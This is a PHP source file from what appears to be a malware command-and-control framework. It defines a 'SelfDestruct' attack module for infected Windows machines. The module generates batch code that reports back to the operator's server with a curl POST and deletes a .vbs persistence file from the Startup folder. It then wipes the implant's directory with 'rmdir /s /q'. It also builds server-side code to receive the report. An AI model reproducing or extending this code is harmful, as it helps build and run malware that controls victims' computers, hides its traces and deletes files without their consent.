<?php /** @noinspection PhpUnused */

namespace Kelvinho\Virus\Attack\AttackPackages\Windows\OneTime;

use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Attack\BaseScriptWin;

class SelfDestruct extends AttackInterface {
    private string $access_token; // this is supposed to increase security, but may not be so, like, now that I think about it, this is pretty unnecessary

    public function __construct() {
        $this->access_token = hash("sha256", rand());
    }

    /**
     * This will generate the intercept code that will be used to take the reported data back from the virus.
     */
    //@formatter:off
    public function generateIntercept(): string {
        ob_start(); ?>
        use Kelvinho\Virus\Attack\AttackInterface;
        use Kelvinho\Virus\Header;

        if (isset($_POST["access_token"])) { $access_token = $_POST["access_token"]; } else { Header::forbidden(); }
        $attack = AttackInterface::get("<?php echo $this->attack_id; ?>");
        if ($attack->getAccessToken() === $access_token) {
            $attack->setExecuted();
            $attack->saveState();
        } else { Header::forbidden(); }
        <?php return ob_get_clean();
    }
    //@formatter:on

    public function getAccessToken(): string {
        return $this->access_token;
    }

    /**
     * This will restore the state of an attack with all of its configuration using a json string.
     *
     * @param string $json The JSON string
     */
    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->access_token = $state["access_token"];
    }

    /**
     * This will get the state of an attack as a json string.
     *
     * @return string The JSON string
     */
    protected function getState(): string {
        $state = [];
        $state["access_token"] = $this->access_token;
        return json_encode($state);
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl -X POST --form "access_token=<?php echo $this->access_token; ?>" <?php echo DOMAIN . "/viruses/$this->virus_id/attacks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    /**
     * This is expected to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
     *
     * @return string
     */
    //@formatter:off
    public function generateBatchCode(): string {
        ob_start();
        $startup_directory = "%appData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
        $UFile = "$startup_directory\\U" . substr($this->virus_id, 0, 5) . ".vbs";
        echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo "del \"$UFile\"\n"; ?>
        rmdir /s /q "%~pd0..\..\.."
        <?php return ob_get_clean();
    }
    //@formatter:on

    /**
     * This will include the correct admin page for this particular attack type.
     */
    public function includeAdminPage(): void {
        include(__DIR__ . "/admin.php");
    }

    /**
     * This will include the correct controller page for this particular attack type.
     */
    public function includeController(): void {
        include(__DIR__ . "/controller.php");
    }
}
